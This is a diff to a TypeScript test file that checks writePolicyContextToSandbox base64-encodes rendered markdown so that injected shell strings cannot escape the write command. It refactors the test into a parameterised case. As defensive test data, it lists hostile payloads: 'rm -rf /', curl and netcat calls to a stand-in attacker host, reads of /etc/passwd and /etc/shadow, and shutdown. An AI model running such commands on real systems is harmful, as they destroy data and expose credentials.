@@ -204,50 +204,55 @@ describe("writePolicyContextToSandbox", () => {
     expect(result.reason).toContain("denied");
   });
 
-  it("encodes hostile markdown payloads as base64 so they cannot break out of the write command", () => {
-    const hostile = [
-      "'; rm -rf / #",
-      "$(curl http://attacker)",
-      "`whoami`",
-      "| nc attacker 4444",
-      "> /etc/passwd",
-      "&& shutdown -h now",
-      "\n; cat /etc/shadow",
-      "newline\r\nthen evil",
-      "$IFS$9 sh -c 'curl evil'",
-    ].join("\n");
-    const build = vi.fn(fakeContext);
-    const render = vi.fn(() => hostile);
-    const exec = vi.fn((_sandbox: string, _command: string) => ({
-      status: 0,
-      stdout: "",
-      stderr: "",
-    }));
+  it.each(
+    [
+        "rm -rf",
+        "curl http://attacker",
+        "whoami",
+        "nc attacker",
+        "/etc/passwd",
+        "shutdown -h",
+        "/etc/shadow",
+        "evil",
+      ],
+  )(
+    "encodes hostile markdown payloads as base64 so they cannot break out of the write command [%s]",
+    (token) => {
+      const hostile = [
+        "'; rm -rf / #",
+        "$(curl http://attacker)",
+        "`whoami`",
+        "| nc attacker 4444",
+        "> /etc/passwd",
+        "&& shutdown -h now",
+        "\n; cat /etc/shadow",
+        "newline\r\nthen evil",
+        "$IFS$9 sh -c 'curl evil'",
+      ].join("\n");
+      const build = vi.fn(fakeContext);
+      const render = vi.fn(() => hostile);
+      const exec = vi.fn((_sandbox: string, _command: string) => ({
+        status: 0,
+        stdout: "",
+        stderr: "",
+      }));
 
-    writePolicyContextToSandbox("alpha", { build, render, exec });
+      writePolicyContextToSandbox("alpha", { build, render, exec });
 
-    const command = exec.mock.calls[0][1];
-    const encoded = Buffer.from(hostile, "utf-8").toString("base64");
-    expect(command).toContain(encoded);
-    // The hostile payload itself must never appear verbatim in the shell
-    // command — only its base64 encoding may appear.
-    for (const token of [
-      "rm -rf",
-      "curl http://attacker",
-      "whoami",
-      "nc attacker",
-      "/etc/passwd",
-      "shutdown -h",
-      "/etc/shadow",
-      "evil",
-    ]) {
+      const command = exec.mock.calls[0][1];
+      const encoded = Buffer.from(hostile, "utf-8").toString("base64");
+      expect(command).toContain(encoded);
+      // The hostile payload itself must never appear verbatim in the shell
+      // command — only its base64 encoding may appear.
+
       expect(command).not.toContain(token);
-    }
-    // The constant target path is the only path interpolated into the
-    // command — guard against future regressions that swap it for a
-    // variable.
-    expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
-    const occurrences = command.split(POLICY_CONTEXT_SANDBOX_PATH).length - 1;
-    expect(occurrences).toBeGreaterThanOrEqual(1);
-  });
+
+      // The constant target path is the only path interpolated into the
+      // command — guard against future regressions that swap it for a
+      // variable.
+      expect(command).toContain(POLICY_CONTEXT_SANDBOX_PATH);
+      const occurrences = command.split(POLICY_CONTEXT_SANDBOX_PATH).length - 1;
+      expect(occurrences).toBeGreaterThanOrEqual(1);
+    },
+  );
 });
